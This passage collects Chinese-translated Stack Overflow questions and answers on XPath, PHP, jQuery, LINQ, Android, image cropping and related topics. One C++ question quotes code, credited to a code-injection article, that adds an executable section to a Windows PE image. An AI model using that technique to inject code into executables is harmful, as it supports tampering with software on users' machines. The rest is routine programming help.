      gl.glClear(GL10.GL_COLOR_BUFFER_BIT | GL10.GL_DEPTH_BUFFER_BIT);
      gl.glEnable(GL10.GL_LIGHTING);
      gl.glPushMatrix();

      gl.glTranslatef(0.0f, -1.2f, z); //Move down 1.2 Unit And Into The Screen 6.0
      gl.glRotatef(xrot, 1.0f, 0.0f, 0.0f); //X
      gl.glRotatef(yrot, 0.0f, 1.0f, 0.0f); //Y

      texture.bind(gl);
      model.draw(gl);

      gl.glPopMatrix();
} 
```

# xml - XPath 包含在两个节点上

> ID：13548926
> 
> 赞同：1
> 
> 时间：2012-11-25T06:45:54.967
> 
> 标签：xml, xpath

我有以下 XML：

```
<Root>
 <Level>
    <Name>John</Name>
    <Key>Lennon</Key>
    <Value>
       <Val>1</Val>
    </Value>
 </Level>
 <Level>
    <Name>Fred</Name>
    <Key>Hi</Key>
    <Value>
       <Val>2</Val>
    </Value>
 </Level>
</Root> 
```

我需要一个 XPath，它将使用关于名称**和**密钥的“包含”。

预期结果是“值/值”。

对于输入：姓名 - 约翰，钥匙 - 列侬

我期望：1

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:51:18.640

我认为这会成功

```
/Root/Level[Name[1] = "John" and Key[1] = "Lennon"]/Value/Val[1] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T14:19:33.630

**使用**：

```
/*/*[Name='John'][Key='Lennon']/Value/Val 
```

这将选择作为任何`Val`元素的子元素的任何`Value`元素，该元素是具有`Name`字符串值字符串“John”的子元素和`Key`具有字符串值字符串“Lennon:”的子元素的子元素，并且（`Value`) 是 XML 文档顶部元素的子元素。

**`Val`如果您只需要所选元素的字符串值，请使用：**

```
string(/*/*[Name='John'][Key='Lennon']/Value/Val) 
```

**除此之外，如果已知任何`Val`值都是数字，请使用：**

```
number(/*/*[Name='John'][Key='Lennon']/Value/Val) 
```

# c++ - PE 文件格式部分添加

> ID：13548932
> 
> 赞同：0
> 
> 时间：2012-11-25T06:46:56.507
> 
> 标签：c++, c, file, format, portable-executable

我对他们为什么在这里使用 - 1 感到困惑。有人可以用非常非常非常非常低的细节解释这条线在做什么......不是它的减法1结构......我需要了解更多......关于低水平......谢谢......

```
PIMAGE_SECTION_HEADER last_section = IMAGE_FIRST_SECTION(nt_headers) + (nt_headers->FileHeader.NumberOfSections - 1); 
```

上面的代码在下面的函数中：

```
//Reference: http://www.codeproject.com/KB/system/inject2exe.aspx
PIMAGE_SECTION_HEADER add_section(const char *section_name, unsigned int section_size, void *image_addr) {
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)image_addr;
    if(dos_header->e_magic != 0x5A4D) {
        wprintf(L"Could not retrieve DOS header from %p", image_addr);
        return NULL;
    }
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)dos_header + dos_header->e_lfanew);
    if(nt_headers->OptionalHeader.Magic != 0x010B) {
        wprintf(L"Could not retrieve NT header from %p", dos_header);
        return NULL;
    }
    const int name_max_length = 8;
    PIMAGE_SECTION_HEADER last_section = IMAGE_FIRST_SECTION(nt_headers) + (nt_headers->FileHeader.NumberOfSections - 1);
    PIMAGE_SECTION_HEADER new_section = IMAGE_FIRST_SECTION(nt_headers) + (nt_headers->FileHeader.NumberOfSections);
    memset(new_section, 0, sizeof(IMAGE_SECTION_HEADER));
    new_section->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
    memcpy(new_section->Name, section_name, name_max_length);
    new_section->Misc.VirtualSize = section_size;
    new_section->PointerToRawData = align_to_boundary(last_section->PointerToRawData + last_section->SizeOfRawData,
        nt_headers->OptionalHeader.FileAlignment);
    new_section->SizeOfRawData = align_to_boundary(section_size, nt_headers->OptionalHeader.SectionAlignment);
    new_section->VirtualAddress = align_to_boundary(last_section->VirtualAddress + last_section->Misc.VirtualSize,
        nt_headers->OptionalHeader.SectionAlignment);
    nt_headers->OptionalHeader.SizeOfImage =  new_section->VirtualAddress + new_section->Misc.VirtualSize;
    nt_headers->FileHeader.NumberOfSections++;
    return new_section;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T08:29:18.047

在 C 和 C++ 中，数组元素的索引从`0`to `n-1`（在 FORTRAN 中从`1`to `n`）。所以，如果你有一个指向`p0`第一个元素的指针，但想要一个指向最后一个元素的指针，你必须添加`n-1`: `plast=p0+n-1`。这就是一切。

# php - 静态方法与静态实例

> ID：13548938
> 
> 赞同：2
> 
> 时间：2012-11-25T06:47:30.037
> 
> 标签：php, mysql, oop, mysqli

考虑下面的代码，Lynda.com 一直认为我要创建这样的数据库类，我的问题是为什么不完全为数据库创建静态方法而不是将实例存储到静态属性中？

```
<?php
class Database {

  private $conn;
  private static $init;

  public function __construct() {
     $this->conn = new mysqli('localhost','root','root','mydb');
  }

  public static function getInstance() {
     self::$init = new self();
     return self::$init;
  }

}

$db = Database::getInstance();

?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-27T15:25:23.430

如果你想使用单例，你应该保护 __construct()

```
class DB
{
  private static $instance;

  private function __construct($args)
  {
    // do some
  }

  public static function getInstance()
  {
    // get instance
  }
}

$query = 'SELECT etc...';
$stmt = DB::getInstance()->prepare($query); 
```

我在 DB 类中使用这种模式。但是，如果您有超过 1 个连接，则不应该！使用单例。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T18:44:48.010

我的猜测是您发布的代码旨在如下，因为它看起来像是一个单例。我只是改变了`getInstance()`方法。

```
class Database {

  private $conn;
  private static $init;

  public function __construct() {
     $this->conn = new mysqli('localhost','root','root','mydb');
  }

  public static function getInstance() {
     if (is_null(self::$init)) {
         self::$init = new self();
     }
     return self::$init;
  }

}

$db = Database::getInstance(); 
```

我认为这应该消除为什么使用静态实例变量的困惑。

如果这不是单例，那么“他们为什么不使用静态方法”的问题应该有“他们应该有”的答案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T07:07:34.210

澄清一下，`$db`是一个数据库对象，它是通过调用静态方法来实例化的`getInstance()`。

> 为什么不完全为数据库创建一个静态方法？

静态方法是在类内部定义的，但是无需实例化类就可以调用它。换句话说，静态方法属于类，因为可以在不实例化对象的情况下调用 in。

您可以根据需要向 Database 类添加方法以与数据库交互。

# jquery - jquery backgroundpositionY动画在Firefox中不起作用

> ID：13548942
> 
> 赞同：0
> 
> 时间：2012-11-25T06:48:35.007
> 
> 标签：jquery, jquery-animate

所以我有一个背景，我想在滚动事件上制作动画，在 chrome 和 safari 中运行良好。

显然，firefox 不能正确支持这一点（opera 也不支持）。

是否有一些其他属性可以用来为跨浏览器工作的背景设置动画？

```
$(document).scroll(function() {    
    var scroll = $(window).scrollTop();

    if (scroll >= 200) {
        $(".col-3-iphoneback").animate( { backgroundPositionY:"-223px"}, { queue:false, duration:1000 });
    } 

     if (scroll <= 200) {
        $(".col-3-iphoneback").animate( { backgroundPositionY:"0px" }, { queue:false, duration:1000 } );
    } 

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T02:10:56.400

`backgroundPositionY`不是标准的 CSS 属性，因此 Firefox 和 Opera 不支持。您需要为 jQuery 使用这些 cssHook 之一：

[https://github.com/louisremi/jquery.backgroundXY.js/blob/master/jquery.backgroundXY.js](https://github.com/louisremi/jquery.backgroundXY.js/blob/master/jquery.backgroundXY.js) [https://github.com/brandonaaron/jquery-cssHooks/blob/master/bgpos.js](https://github.com/brandonaaron/jquery-cssHooks/blob/master/bgpos.js)

# jsp - IE自定义404错误页面不起作用jsp

> ID：13548943
> 
> 赞同：0
> 
> 时间：2012-11-25T06:48:54.210
> 
> 标签：jsp, jakarta-ee, servlets, error-handling, custom-error-pages

我正在尝试放置自定义 404 错误页面 ....它适用于 chrome 和 firefox，但对于 IE，它会显示自己的错误页面。

我知道在 IE 中，如果您取消选中“显示友好错误消息”，那么它会显示我的自定义错误页面。

但我不能说每个用户都请取消选中它...:)

在这种情况下如何显示自定义错误页面。

此外，是否有任何直接的解决方案可以实现这一目标。

一定有我遗漏的东西，因为当我打开 google.com/aaa 时，它没有选中“显示友好的错误消息”，而是显示 google 自定义错误页面。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T07:07:36.167

如果您在 Apache 服务器上，则可以使用“.htaccess”文件。如果您以前从未这样做过，这里有一个简单的方法：打开一个文本编辑器，创建一个新文件并给它以下行：

```
ErrorDocument 404 /notfound.html 
```

然后将文件保存为“htaccess”（没有前面的句号）。然后上传到你的根目录，重命名为“.htaccess”（加上前面的句号，没有文件扩展名）。

该指令告诉 Apache 通过指定路径在 Apache 找不到它需要的文件（即“google.com/aaa”）时提供“notfound.html”。将“notfound.html”也放在根目录中（或者如果您希望它在不同的目录中，只需将路径更改为“/other-directory/notfound.html”之类的东西）。

希望有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-11T16:27:17.453

这取决于您使用的服务器。

重要的一点是确保您的错误页面大小至少为 512 个字节。如果错误页面的大小小于 0.5kB，IE 将替换它自己的错误消息。

如果您从 IIS 服务器提供服务，则需要启用自定义 ASP 错误功能。

# php - 如何将变量插入到 PHP 的“包含”中？

> ID：13548946
> 
> 赞同：0
> 
> 时间：2012-11-25T06:49:23.643
> 
> 标签：php, url, variables, syntax, include

没什么好解释的，我只是想不出在包含 URL 中使用变量的正确语法

这是我的想法：

```
$round_num=1;
include '../../fixtures/round{$round_num}fix.php'; 
```

它返回通常的：

```
Warning: include(../../fixtures/round{$round_num}fix.php) [function.include]: failed to open stream: No such file or directory 
```

对于你们所有人来说，这一定是一个非常简单的问题，哈哈，但我在任何地方都找不到我的答案！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T06:50:33.690

使用双引号 ( `"`) 来分隔您的字符串。字符串插值不会出现在单引号 ( `'`) 字符串中。

```
$round_num=1;
include "../../fixtures/round{$round_num}fix.php"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:55:59.783

您还可以使用替代语法，例如：

```
include "../../fixtures/round" . $round_num . "fix.php"; 
```

有时，为了清晰起见，人们更喜欢让他们的 IDE 突出显示变量。

# c# - 由于类型不匹配，LINQ Join 失败

> ID：13548948
> 
> 赞同：1
> 
> 时间：2012-11-25T06:49:29.167
> 
> 标签：c#, linq, linq-to-sql, linq-to-objects

我需要来自 2 个不同数据库的数据。我试过以下

```
var User = (from U in _db.TblUsers
                        where U.IsAdmin == false
                        select U).ToList();

var AspNewsUser = (from A in _dbAspNet.aspnet_Users                        
                   select A).ToList();

var result = (from U in User
              join A in AspNewsUser
              on U.UserID equals A.UserId
              select U); 
```

但我收到以下错误消息

> *join 子句中的表达式之一的类型不正确。对“加入”的调用中的类型推断失败。*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T12:40:09.317

正如您在[aspnet_Users 的表架构中](http://www.adivo.com/samples/database/aspnetdb/TB-ASPNETDB-aspnet_Users.htm)看到的那样，`Userid`是一个[`uniqueidentifier`](http://msdn.microsoft.com/en-us/library/ms187942.aspx)（映射到实体框架中的 GUID）。我敢打赌，`TblUsers.UserID`它有不同的类型（如`int`）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T07:11:23.940

使用投影，使它们成为相同的匿名类型。

```
 var Users = (from U in _db.TblUsers
                    where U.IsAdmin == false
                    select new { UserID = U.UserID }).ToList();

    var AspNewsUsers = (from A in _dbAspNet.aspnet_Users                        
                    select new { UserID = A.UserID }).ToList();

    var result = (from i in Users join o in AspNewUsers on i.UserID equals o.UserID).ToList(); 
```

# jquery - jQuery：如何同时验证复选框和输入文本？

> ID：13548952
> 
> 赞同：1
> 
> 时间：2012-11-25T06:49:43.770
> 
> 标签：jquery, html, validation, input, checkbox

我有一个 div，其中有 2 个复选框和 2 个输入文本，但我想验证或检查所有输入是否为空以显示警报或错误并填充至少一个输入（复选框或文本），因为我不这样做两个验证：1 用于复选框和 2 用于输入文本......是否有任何方法可以做到这一点？

**HTML**

```
<div id="t_disp">
    <p>
        <label for="7x24">7x24</label>
        <input id="7x24" name="7x24" type="checkbox"/>
    </p>
    <p>
        <label for="5x8">5x8</label>
        <input id="5x8" name="5x8" type="checkbox"/>
    </p>
    <p>
        <label for="especial">Especial</label>
        <input id="especial" name="especial" type="text"/>
    </p>
    <p>
        <label for="ticket">Ticket</label>
        <input id="ticket" name="ticket" type="text"/>
    </p>
</div> 
```

提前致谢！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:58:41.930

要获得填充/检查了多少输入：

```
var filled = $('#t_disp input').filter(function() { 
  return $(this).is('[type=checkbox]') ? this.checked : this.value;
}).length;

if ( filled ) {
   // at least one input is filled
} else {
   // all inputs are empty
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:56:48.113

对于文本输入，您可以检查该值。

```
$('#especial').val();
$('#ticket').val(); 
```

对于复选框，您可以检查它们是否被选中。

```
$('#7x24').attr('checked'); // returns 'checked' if checked
$('#5x8').attr('checked'); 
```

然后，您只需要将它们全部固定在一个条件下。如果它们都是空的或未选中，那么您将显示您的错误。

PS根据我的经验`id=`，从数字开始并不能很好地工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T07:28:08.690

您可以使用以下功能

```
function validate()
{

    var isFormValid = false;

        $("#t_disp input:text").each(function()
        {
      if ($.trim($(this).val()).length > 0)
           {      isFormValid = true;    }
        });

     var len =  $("#t_disp input:checked").length;
     if( len > 0 ) { isFormValid = true; }

        if (!isFormValid) 
        alert("Please fill atleast on one field.");

} 
```

# objective-c - 将 OSReturn 值转换为人类可读的定义

> ID：13548957
> 
> 赞同：3
> 
> 时间：2012-11-25T06:50:21.133
> 
> 标签：objective-c, macos, iokit, kernel-extension

我正在使用其中的一些函数`IOKit/kext/KextManager.h`以编程方式加载内核扩展，并且遇到了新的错误值。例如：

```
OSReturn osr = KextManagerLoadKextWithIdentifier(...);
// => -603947004 
```

如何将此值转换为中找到的人类可读定义之一`libkern/OSReturn.h`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T07:31:53.167

根据@pmjordan 的[评论](https://stackoverflow.com/questions/13548957/translate-osreturn-value-to-human-readable-definition/13560467#comment18564487_13548957)，我刚刚使用来自`OSReturn.h`.

```
- (void)human_readable_libkern_metaclass_error_message:(int) n {
  switch(n){
    case 0:
      printf("%s", "no error");
      break;
    case kOSMetaClassInternal:
      // libkern_metaclass_err(1) -603979775
      printf("%s", "Internal OSMetaClass run-time error.");
      break;
    case kOSMetaClassHasInstances:
      // libkern_metaclass_err(2) -603979774
      printf("%s", "A kext cannot be unloaded because there are instances derived from Libkern C++ classes that it defines.");
      break;
    case kOSMetaClassNoInit:
      // libkern_metaclass_err(3) -603979773
      printf("%s", "Internal error: The Libkern C++ class registration system was not properly initialized during kext loading.");
      break;
    case kOSMetaClassNoTempData:
      // libkern_metaclass_err(4) -603979772
      printf("%s", "Internal error: An allocation failure occurred registering Libkern C++ classes during kext loading.");
      break;
    case kOSMetaClassNoDicts:
      // libkern_metaclass_err(5) -603979771
      printf("%s", "Internal error: An allocation failure occurred registering Libkern C++ classes during kext loading.");
      break;
    case kOSMetaClassNoKModSet:
      // libkern_metaclass_err(6) -603979770
      printf("%s", "Internal error: An allocation failure occurred registering Libkern C++ classes during kext loading.");
      break;
    case kOSMetaClassNoInsKModSet:
      // libkern_metaclass_err(7) -603979769
      printf("%s", "Internal error: An error occurred registering a specific Libkern C++ class during kext loading.");
      break;
    case kOSMetaClassNoSuper:
      // libkern_metaclass_err(8) -603979768
      printf("%s", "Internal error: No superclass can be found for a specific Libkern C++ class during kext loading.");
      break;
    case kOSMetaClassInstNoSuper:
      // libkern_metaclass_err(9) -603979767
      printf("%s", "Internal error: No superclass can be found when constructing an instance of a Libkern C++ class.");
      break;
    case kOSMetaClassDuplicateClass:
      // libkern_metaclass_err(10) -603979766
      printf("%s", "A duplicate Libkern C++ classname was encountered during kext loading.");
      break;
    case kOSMetaClassNoKext:
      // libkern_metaclass_err(11) -603979765
      printf("%s", "Internal error: The kext for a Libkern C++ class can't be found during kext loading.");
      break;
    default:
      printf("%s", "Unknown: error not defined in <libkern/OSReturn.h>)");
      break;
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-07-12T10:51:15.700

XXX 加载失败 - (libkern/kext) 没有特权；检查系统/内核日志是否有错误或尝试 kextutil(8)。

当您在没有 root 权限的情况下尝试 kextload 时收到的错误消息。

-603947004 - 当您尝试通过没有 root 权限的代码加载 kext 时，此代码会出现在 OSReturn 中。上面的翻译代码适用于已定义的情况，但对于未定义的错误代码，通过终端调用命令会有所帮助。

# gwt - 在特定 div 中呈现主演示者视图

> ID：13548959
> 
> 赞同：0
> 
> 时间：2012-11-25T06:51:05.703
> 
> 标签：gwt, gwt-platform, gwtp

对于基于 GWTP 的 MVP，将使用以下代码显示典型的主要演示者：

```
@Override
protected void revealInParent() {
    RevealRootContentEvent.fire(this, this);
} 
```

这将在整个浏览器页面中呈现与“主演示者”关联的视图。有没有办法让主演示者的视图仅在页面中的特定 DIV 中呈现。而不是整个页面？

例如：

```
<div id="main-presenter"></div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T10:20:50.900

查看[嵌套演示者](https://code.google.com/p/gwt-platform/wiki/SimpleNestedSample)

```
@Override
protected void revealInParent() {
    RevealContentEvent.fire(this, MainPagePresenter.TYPE_SetMainContent,
            this);
} 
```

# c# - 裁剪/删除图像边缘不需要的空间

> ID：13548962
> 
> 赞同：14
> 
> 时间：2012-11-25T06:51:19.213
> 
> 标签：c#, asp.net, .net, image-processing, gdi+

我进行了很多搜索以删除不需要的空间，但找不到。我只找到了可以用来删除黑白背景空间的链接。但我的背景图像可以是任何东西。所以，如果我有这些图片，

![在此处输入图像描述](../Images/7517d35c888a886a61e3b61a2ce4e8f7.png)

![图片1](../Images/19b4219b1e1b291776d78fd3b4f2499c.png)

![在此处输入图像描述](../Images/6a6839766cac55fe65722faf349cd262.png)

如何提取我需要的图像部分。例如，

![在此处输入图像描述](../Images/edf9648b56d94cc6c103b6ed99545bd5.png) ![在此处输入图像描述](../Images/74f267466ec0e9acfeff0dbc15dfe3c5.png) ![在此处输入图像描述](../Images/f5a0088ecbea79e848a25a81ba0ef18a.png)

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-06-17T09:58:34.323

这是我对您的问题的解决方案：

我已经声明了一个获取原始图像的方法，然后它通过检查提供的 Image 的角来查找背景颜色，如果至少 3 个角具有相似的颜色**（最多 10% 偏移），**那么我们就找到了背景颜色它试图在图像中找到那些形状的边界，这些形状的颜色当然与背景颜色不同

找到边界后，函数裁剪图像并将新的裁剪区域作为新的位图返回！

这是演示文件：[下载](https://www.dropbox.com/s/aqe18lfdrt05eja/Demo.exe?dl=0)

完整解决方案：[下载](https://www.dropbox.com/s/wpf78g3lmzq3jg4/Demo.rar?dl=0)

以下是 的结果：

**`Image 1`：**

![在此处输入图像描述](../Images/f71bdca2806f8383bf083becaf9ae2e8.png)

**`Image 2`：**

![在此处输入图像描述](../Images/0fdf10b62c5c3b5c08904db591ba8969.png)

**`Image 3`：**

![在此处输入图像描述](../Images/cf28163e49c973c9d63933a82dc8db3c.png)

`ImageProcessingTools`这是Simplified类中的函数，

```
public class ImageHelper
{
    #region CropUnwantedBackground
    public static Bitmap CropUnwantedBackground(Bitmap bmp)
    {
        var backColor = GetMatchedBackColor(bmp);
        if (backColor.HasValue)
        {
            var bounds = GetImageBounds(bmp, backColor);
            var diffX = bounds[1].X - bounds[0].X + 1;
            var diffY = bounds[1].Y - bounds[0].Y + 1;
            var croppedBmp = new Bitmap(diffX, diffY);
            var g = Graphics.FromImage(croppedBmp);
            var destRect = new Rectangle(0, 0, croppedBmp.Width, croppedBmp.Height);
            var srcRect = new Rectangle(bounds[0].X, bounds[0].Y, diffX, diffY);
            g.DrawImage(bmp, destRect, srcRect, GraphicsUnit.Pixel);
            bmp.Dispose();
            return croppedBmp;
        }
        else
        {
            bmp.Dispose();
            return null;
        }
    }
    #endregion

    #region Private Methods

    #region GetImageBounds
    private static Point[] GetImageBounds(Bitmap bmp, Color? backColor)
    {
        //--------------------------------------------------------------------
        // Finding the Bounds of Crop Area bu using Unsafe Code and Image Proccesing
        Color c;
        int width = bmp.Width, height = bmp.Height;
        bool upperLeftPointFounded = false;
        var bounds = new Point[2];
        for (int y = 0; y < height; y++)
        {
            for (int x = 0; x < width; x++)
            {
                c = bmp.GetPixel(x, y);
                bool sameAsBackColor = ((c.R <= backColor.Value.R * 1.1 && c.R >= backColor.Value.R * 0.9) &&
                                        (c.G <= backColor.Value.G * 1.1 && c.G >= backColor.Value.G * 0.9) &&
                                        (c.B <= backColor.Value.B * 1.1 && c.B >= backColor.Value.B * 0.9));
                if (!sameAsBackColor)
                {
                    if (!upperLeftPointFounded)
                    {
                        bounds[0] = new Point(x, y);
                        bounds[1] = new Point(x, y);
                        upperLeftPointFounded = true;
                    }
                    else
                    {
                        if (x > bounds[1].X)
                            bounds[1].X = x;
                        else if (x < bounds[0].X)
                            bounds[0].X = x;
                        if (y >= bounds[1].Y)
                            bounds[1].Y = y;
                    }
                }
            }
        }
        return bounds;
    } 
    #endregion

    #region GetMatchedBackColor
    private static Color? GetMatchedBackColor(Bitmap bmp)
    {
        // Getting The Background Color by checking Corners of Original Image
        var corners = new Point[]{
            new Point(0, 0),
            new Point(0, bmp.Height - 1),
            new Point(bmp.Width - 1, 0),
            new Point(bmp.Width - 1, bmp.Height - 1)
        }; // four corners (Top, Left), (Top, Right), (Bottom, Left), (Bottom, Right)
        for (int i = 0; i < 4; i++)
        {
            var cornerMatched = 0;
            var backColor = bmp.GetPixel(corners[i].X, corners[i].Y);
            for (int j = 0; j < 4; j++)
            {
                var cornerColor = bmp.GetPixel(corners[j].X, corners[j].Y);// Check RGB with some offset
                if ((cornerColor.R <= backColor.R * 1.1 && cornerColor.R >= backColor.R * 0.9) &&
                    (cornerColor.G <= backColor.G * 1.1 && cornerColor.G >= backColor.G * 0.9) &&
                    (cornerColor.B <= backColor.B * 1.1 && cornerColor.B >= backColor.B * 0.9))
                {
                    cornerMatched++;
                }
            }
            if (cornerMatched > 2)
            {
                return backColor;
            }
        }
        return null;
    }  
    #endregion

    #endregion
} 
```

这是 ASP.NET 中的一个简单用法，

```
if (IsPostBack && Request.Files.Count > 0)
{
    var file = Request.Files[0];
    var bmp = new Bitmap(file.InputStream);
    var croppedBmp = ImageHelper.CropUnwantedBackground(bmp);
    Response.ContentType = file.ContentType;
    croppedBmp.Save(Response.OutputStream, ImageFormat.Jpeg);
    Response.End();
} 
```

最后我要提一下，这些很棒的教程在图像处理方面帮助了我很多：

[**使用 C# 和 GDI+ 进行傻瓜式图像处理**](http://www.codeproject.com/Articles/1989/Image-Processing-for-Dummies-with-C-and-GDI-Part-1)

[**使用 C# 进行图像处理**](http://www.codeproject.com/Articles/33838/Image-Processing-using-C)

希望能帮助到你 ：）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-06-18T15:31:01.117

## 这是一种更可靠的方法，它使用 Sobel 能量过滤器和快速边界框检测例程（从[ImageResizer的](http://imageresizing.net/)[WhitespaceTrimmer 插件](http://imageresizing.net/plugins/whitespacetrimmer)中提取）。

```
namespace ImageResizer.Plugins.WhitespaceTrimmer {
public class BoundingBoxFinder {

    /// <summary>
    /// Returns a rectangle inside 'lookInside' that bounds any energy greater than 'threshold'. 
    /// </summary>
    /// <param name="image"></param>
    /// <param name="lookInside">A rectangle of 'image' to look inside. </param>
    /// <param name="threshold">1-255, the energy threshold to detect activity. 80-150 is a good range.</param>
    /// <returns></returns>
    public Rectangle FindBoxSobel(Bitmap originalImage, Rectangle lookInside, byte threshold) {

        Bitmap image = originalImage;
        try {
            //Convert if needed (makes an extra copy)
            if (image.PixelFormat != PixelFormat.Format24bppRgb &&
                image.PixelFormat != PixelFormat.Format32bppArgb &&
                image.PixelFormat != PixelFormat.Format32bppRgb) {
                image = AForge.Imaging.Image.Clone(image, PixelFormat.Format24bppRgb);
            }

            //Crop if needed (makes an extra copy unless we converted too, then only 1 extra copy)
            if (!lookInside.Equals(new Rectangle(0, 0, image.Width, image.Height))) {
                Bitmap oldImage = image;
                try {
                    image = new Crop(lookInside).Apply(image);
                } finally {
                    if (oldImage != originalImage) oldImage.Dispose(); //Dispose the cloned 
                }
            }

            //Makes 1 more copy at 1/3rd the size, in grayscale
            Rectangle result = FindBoxSobel(image, threshold);
            return new Rectangle(lookInside.X + result.X, lookInside.Y + result.Y, result.Width, result.Height);

        } finally {
            if (image != originalImage) image.Dispose();
        }

    }
    /// <summary>
    /// Requires 24 bit or 32 bit (A) RGB image. 
    /// </summary>
    /// <param name="rgb"></param>
    /// <param name="threshold"></param>
    /// <returns></returns>
    public Rectangle FindBoxSobel(Bitmap rgb, byte threshold) {
        using (Bitmap gray = Grayscale.CommonAlgorithms.Y.Apply(rgb)) {

            //Apply sobel operator to grayscale image
            new SobelEdgeDetector().ApplyInPlace(gray);
            //Threshold into black and white.
            new Threshold(threshold).ApplyInPlace(gray);
            //Trim only exact black pixels
            // lock source bitmap data
            BitmapData data = gray.LockBits(new Rectangle(0, 0, gray.Width, gray.Height), ImageLockMode.ReadOnly, gray.PixelFormat);
            try {
                return FindBoxExactGrayscale(data, 0);
            } finally {
                gray.UnlockBits(data);
            }
        }
    }
    /// <summary>
    /// Returns a bounding box that only excludes the specified color. 
    /// Only works on 8-bit images.
    /// </summary>
    /// <param name="sourceData"></param>
    /// <param name="colorToRemove">The palette index to remove.</param>
    /// <returns></returns>
    public Rectangle FindBoxExactGrayscale(BitmapData sourceData, byte indexToRemove) {
        if (sourceData.PixelFormat != PixelFormat.Format8bppIndexed) throw new ArgumentOutOfRangeException("FindBoxExact only operates on 8-bit grayscale images");
        // get source image size
        int width = sourceData.Width;
        int height = sourceData.Height;
        int offset = sourceData.Stride - width;

        int minX = width;
        int minY = height;
        int maxX = 0;
        int maxY = 0;

        // find rectangle which contains something except color to remove
        unsafe {
            byte* src = (byte*)sourceData.Scan0;

            for (int y = 0; y < height; y++) {
                if (y > 0) src += offset; //Don't adjust for offset until after first row
                for (int x = 0; x < width; x++) {
                    if (x > 0 || y > 0) src++; //Don't increment until after the first pixel.
                    if (*src != indexToRemove) {
                        if (x < minX)
                            minX = x;
                        if (x > maxX)
                            maxX = x;
                        if (y < minY)
                            minY = y;
                        if (y > maxY)
                            maxY = y;
                    }
                }
            }
        }

        // check
        if ((minX == width) && (minY == height) && (maxX == 0) && (maxY == 0)) {
            minX = minY = 0;
        }

        return new Rectangle(minX,minY,maxX - minX + 1, maxY - minY + 1);
    }
}
} 
```

# android - App Drawsomething 中用于选择颜色的容器是什么？

> ID：13548963
> 
> 赞同：0
> 
> 时间：2012-11-25T06:51:23.207
> 
> 标签：android, slider, containers

我正在开发一个 android 应用程序，它可以让你从一系列颜色样本中选择一种颜色。我想知道在“Draw Something”应用程序中使用了哪个容器，用户可以在其中将手指滑过颜料样本，然后将颜料样本移过来以显示之前不在屏幕上的其余颜色。

如果你还没有使用过这个应用程序，这里是他们的网站，上面有一个应用程序外观的屏幕截图：http: [//omgpop.com/drawsomething](http://omgpop.com/drawsomething)

任何建议或意见表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T16:49:21.867

我认为这将是一个特殊的工具，但它只是一个滚动视图

# visual-studio-2010 - MVC 操作不会被 jquery ajax 调用击中

> ID：13548964
> 
> 赞同：1
> 
> 时间：2012-11-25T06:51:52.067
> 
> 标签：visual-studio-2010, jquery, knockout.js

我有以下 Knockout.js 代码：

```
this.submitRequest = function () {
           var url = '@Url.Action("GetDetails", "BrowseItems")';

           $.ajax({
                url: url,
                type: 'POST',
                contentType: 'application/json; charset=utf-8',
                data: ko.toJSON(self.searchRequest),
                success: function (data) { }
            });
        }; 
```

这个 ajax 调用应该在 BrowseItems 控制器中触发 GetDetails 操作，它对我的​​伙伴有效，但对我无效。完全相同的代码。我什至爆破我的整个项目并从 TFS 重新加载它，以确保没有代码怪癖。所以，我知道我和我的搭档有相同的代码，但它适用于他，但不适用于我。在我看来，我必须设置某种 Visual Studio 环境设置。谁能帮我解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T09:11:05.460

首先，您如何测试它是否被击中？调试？因为如果是这样，这可能是一个问题，就像您通过 IIS 运行并使用 IIS 页面并通过 Visual Studio 本地服务器进行调试一样，您将永远不会让 Visual Studio 检测到 IIS 上的错误。但是，可以说您只是单击听起来像的运行（调试）。接下来我要检查的是你的 Global.asax 文件，它有你的路线设置。如果您没有看到可能导致问题的 {controller}/{action} 之类的内容。最后一个建议是，不要将@Url 包装在“”中，而是将其包装在“”中。

# android - 如何使文本视图的大小与设备的物理大小成比例

> ID：13548966
> 
> 赞同：0
> 
> 时间：2012-11-25T06:52:13.687
> 
> 标签：android, layout, textview, width

关于这个问题，我已经研究了一段时间。在我的布局中，我有一个 textview。如何使我的 textview 宽度的宽度为屏幕物理宽度的一半？我可以直接在 xml 布局中执行，还是应该在 java 代码中有一个函数，它获取物理大小并将 textview 的大小设置为一半？我不在乎分辨率。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T07:41:40.073

您应该为您的 TextView 使用 layout_wheight 属性：

```
Android:layout_width="0dp"
Android:layout_weight=1 
```

在要放置在 TextView 一侧的布局上使用相同的属性（和相同的权重），它们将具有相同的大小 = 物理屏幕的 1/2。

# vb.net - 最小化事件处理程序

> ID：13548967
> 
> 赞同：0
> 
